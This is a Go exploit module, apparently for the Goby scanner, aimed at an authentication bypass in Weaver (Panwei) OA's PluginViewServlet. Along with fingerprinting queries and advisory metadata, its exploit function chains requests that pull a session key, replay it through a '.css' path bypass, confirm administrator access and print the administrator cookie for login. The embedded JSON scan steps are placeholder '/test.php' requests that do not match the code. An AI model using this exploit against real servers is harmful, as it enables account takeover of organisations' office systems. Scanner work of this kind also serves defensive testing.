package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver OA PluginViewServlet Authentication Bypass Vulnerability",
    "Description": "<p>Weaver OA is a professional and powerful multi-functional office management software that supports mobile approval, attendance, query, sharing and other functions, effectively improving the user's office efficiency.</p><p>There is an authentication bypass vulnerability in Panwei OA weaver.mobile.plugin.ecology.service.PluginViewServlet, and attackers can log in arbitrarily to obtain administrator privileges.</p>",
    "Product": "Wild-Collaborative-Business-System",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-01-29",
    "Author": "corp0ra1",
    "FofaQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "GobyQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "Level": "2",
    "Impact": "<p>There is an authentication bypass vulnerability in Panwei OA weaver.mobile.plugin.ecology.service.PluginViewServlet, and attackers can log in arbitrarily to obtain administrator privileges.</p>",
    "Recommendation": "<p>The manufacturer has released security patches, please pay attention to the official website for updates: <a href=\"https://www.weaver.com.cn/.\">https://www.weaver.com.cn/.</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "泛微OA办公系统 PluginViewServlet 认证绕过漏洞",
            "Product": "泛微-协同商务系统",
            "Description": "<p>泛微OA 是一款专业强大的多功能办公管理软件，支持移动审批、考勤、查阅、共享等功能，有效的提高了用户的办公效率。<br></p><p>泛微OA weaver.mobile.plugin.ecology.service.PluginViewServlet存在认证绕过漏洞，攻击者可实现任意登录获取管理员权限。<br></p>",
            "Recommendation": "<p>厂商已发布安全补丁，请及时关注官网更新：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a>。<br></p>",
            "Impact": "<p>泛微OA weaver.mobile.plugin.ecology.service.PluginViewServlet存在认证绕过漏洞，攻击者可实现任意登录获取管理员权限。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Weaver OA PluginViewServlet Authentication Bypass Vulnerability",
            "Product": "Wild-Collaborative-Business-System",
            "Description": "<p>Weaver OA is a professional and powerful multi-functional office management software that supports mobile approval, attendance, query, sharing and other functions, effectively improving the user's office efficiency.<br></p><p>There is an authentication bypass vulnerability in Panwei OA weaver.mobile.plugin.ecology.service.PluginViewServlet, and attackers can log in arbitrarily to obtain administrator privileges.<br></p>",
            "Recommendation": "<p>The manufacturer has released security patches, please pay attention to the official website for updates: <a href=\"https://www.weaver.com.cn/.\">https://www.weaver.com.cn/.</a><br></p>",
            "Impact": "<p>There is an authentication bypass vulnerability in Panwei OA weaver.mobile.plugin.ecology.service.PluginViewServlet, and attackers can log in arbitrarily to obtain administrator privileges.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10796"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/mobilemode/public.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "from=QRCode&url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && strings.Contains(resp.RawBody, "var _sessionkey = \"") {
				sessionkey := regexp.MustCompile("var _sessionkey = \"(.*?)\";").FindStringSubmatch(resp.RawBody)
				uri2 := "/weaver/weaver.mobile.plugin.ecology.service.PluginViewServlet/.css"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Data = "sessionkey=" + sessionkey[1]
				if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					uri3 := "/api/hrm/usericon/getUserIcon?userId=1"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					cfg3.Header.Store("Cookie", resp2.Cookie)
					if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp3.RawBody, "{\"headformat\":")

					}
				}

			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/mobilemode/public.jsp"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "from=QRCode&url=CC4DFA20F3CF7CF61F86C43FA6A84C7020E42052CDB6847AEF9362D0FA570CB7"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil && strings.Contains(resp.RawBody, "var _sessionkey = \"") {
				sessionkey := regexp.MustCompile("var _sessionkey = \"(.*?)\";").FindStringSubmatch(resp.RawBody)
				uri2 := "/weaver/weaver.mobile.plugin.ecology.service.PluginViewServlet/.css"
				cfg2 := httpclient.NewPostRequestConfig(uri2)
				cfg2.VerifyTls = false
				cfg2.FollowRedirect = false
				cfg2.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg2.Data = "sessionkey=" + sessionkey[1]
				if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
					uri3 := "/api/hrm/usericon/getUserIcon?userId=1"
					cfg3 := httpclient.NewGetRequestConfig(uri3)
					cfg3.VerifyTls = false
					cfg3.FollowRedirect = false
					cfg3.Header.Store("Cookie", resp2.Cookie)
					if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil {
						if resp2.StatusCode == 200 && strings.Contains(resp3.RawBody, "{\"headformat\":") {
							expResult.Output = "请使用以下Cookie登录：" + resp2.Cookie
							expResult.Success = true
						}

					}
				}

			}
			return expResult
		},
	))
}